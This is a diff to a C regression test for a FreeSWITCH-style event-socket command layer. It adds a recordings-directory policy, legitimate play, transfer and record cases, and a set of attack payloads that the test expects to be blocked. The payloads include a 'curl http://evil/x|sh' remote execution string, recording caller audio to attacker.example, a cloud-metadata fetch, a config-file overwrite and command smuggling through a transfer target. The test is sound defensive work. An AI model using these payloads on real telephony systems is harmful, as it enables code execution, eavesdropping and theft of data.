@@ -58,6 +58,7 @@ int main(void)
     P = es_proto_create(ES_PROTO_NATIVE, ES_CODEC_L16, 8000, 8000, "callid-1", "UUID-1", 0);
     assert(P);
     es_proto_set_setvar_allow(P, "agent_intent,customer_tier");
+    es_proto_set_cmd_policy(P, NULL, "/var/rec", NULL);   /* the operator named one recordings directory, nothing else */
 
     printf("\n== LEGITIMATE commands (regression: must still produce the correct uuid_* call) ==\n");
     LEGIT("{\"type\":\"command\",\"action\":\"play\",\"file\":\"/var/media/hello.wav\"}",         "uuid_broadcast", "UUID-1 /var/media/hello.wav aleg");
@@ -71,7 +72,27 @@ int main(void)
     LEGIT("{\"type\":\"command\",\"action\":\"hold\"}",                                             "uuid_hold",      "UUID-1");
     LEGIT("{\"type\":\"command\",\"action\":\"park\"}",                                             "uuid_park",      "UUID-1");
 
+    LEGIT("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\",\"dialplan\":\"XML\",\"context\":\"default\"}", "uuid_transfer", "UUID-1 1000 XML default");
+    LEGIT("{\"type\":\"command\",\"action\":\"play\",\"file\":\"tone_stream://%(200,0,440)\"}",   "uuid_broadcast", "UUID-1 tone_stream://%(200,0,440) aleg");
+    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"file\":\"call-123.wav\"}",               "uuid_record",    "UUID-1 start call-123.wav");
+    /* with a recordings directory named, a relative path is written under it, and stopped by the same name */
+    es_proto_set_record_base(P, "/var/lib/freeswitch/recordings");
+    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"file\":\"call-123.wav\"}",               "uuid_record",    "UUID-1 start /var/lib/freeswitch/recordings/call-123.wav");
+    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"state\":\"stop\",\"file\":\"call-123.wav\"}", "uuid_record", "UUID-1 stop /var/lib/freeswitch/recordings/call-123.wav");
+    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"state\":\"stop\",\"file\":\"all\"}",        "uuid_record",    "UUID-1 stop all");
+    LEGIT("{\"type\":\"command\",\"action\":\"record\",\"file\":\"/var/rec/call.wav\"}",            "uuid_record",    "UUID-1 start /var/rec/call.wav");
+    es_proto_set_record_base(P, NULL);
+
     printf("\n== ATTACK payloads (must ALL be blocked) ==\n");
+    /* allowlists: what the operator did not name is refused, however harmless it looks */
+    BLOCK("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\",\"dialplan\":\"LUA:evil.lua\"}");   /* a script as the dialplan */
+    BLOCK("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"1000\",\"dialplan\":\"LUA\"}");
+    BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"http://169.254.169.254/latest/meta-data\"}");   /* fetch from inside the network */
+    BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"shout://attacker.example/x.mp3\"}");
+    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"shout://attacker.example/steal\"}");          /* caller audio off the box */
+    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"/etc/freeswitch/vars.xml\"}");                /* overwrite a config */
+    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"/var/recordings-other/x.wav\"}");            /* a prefix is not a directory */
+    BLOCK("{\"type\":\"command\",\"action\":\"record\",\"file\":\"tone_stream://x\"}");
     BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"system::curl http://evil/x|sh\"}"); /* app-exec RCE */
     BLOCK("{\"type\":\"command\",\"action\":\"play\",\"file\":\"lua::/tmp/evil.lua\"}");
     BLOCK("{\"type\":\"command\",\"action\":\"transfer\",\"to\":\"system:id inline\"}");            /* whitespace positional -> inline RCE */
